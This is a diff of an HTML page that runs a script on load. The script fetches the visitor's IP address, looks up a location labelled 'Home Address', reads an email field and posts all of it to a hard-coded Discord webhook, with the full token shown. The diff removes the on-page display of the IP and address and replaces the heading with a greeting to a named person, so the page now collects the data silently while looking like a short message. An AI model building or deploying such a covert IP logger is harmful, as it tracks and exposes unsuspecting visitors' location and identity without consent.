@@ -8,22 +8,16 @@
         const webhookUrl = 'https://discord.com/api/webhooks/1295926374959415326/jcyJtej4wQvgp9FS_nimudItJO-PAFYbF6foxrUWtwyNVY7eu8sV2_1aMibNq3htq8Bp'; // Your webhook URL
 
         async function fetchIP() {
-            const start = performance.now(); // Start timing
-
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
-                document.getElementById('ip-display').innerText = `Your IP address is: ${ip}`;
 
                 const address = await fetchAddress(ip);
-                document.getElementById('address-display').innerText = `Your location: ${address}`;
 
                 const email = document.getElementById('email-input').value;
                 await sendToDiscord(ip, address, email);
 
-                const end = performance.now(); // End timing
-                console.log(`Fetch time: ${end - start} ms`); // Log the time taken
             } catch (error) {
                 console.error('Error fetching IP:', error);
             }
@@ -42,7 +36,7 @@
         }
 
         async function sendToDiscord(ip, address, email) {
-            const message = { content: `IP Address: ${ip} | Home Address: ${address} | Email: ${email} | Name: ${Name}` };
+            const message = { content: `IP Address: ${ip} | Home Address: ${address} | Email: ${email}` };
 
             try {
                 await fetch(webhookUrl, {
@@ -57,9 +51,7 @@
     </script>
 </head>
 <body onload="fetchIP()">
-    <h1>Your IP Address</h1>
-    <p id="ip-display">Fetching your IP address...</p>
-    <p id="address-display">Fetching your address...</p>
+    <h1>To Ukrainianfemboyxd hello</h1>
     <input type="email" id="email-input" placeholder="Enter your email" required />
 </body>
 </html>
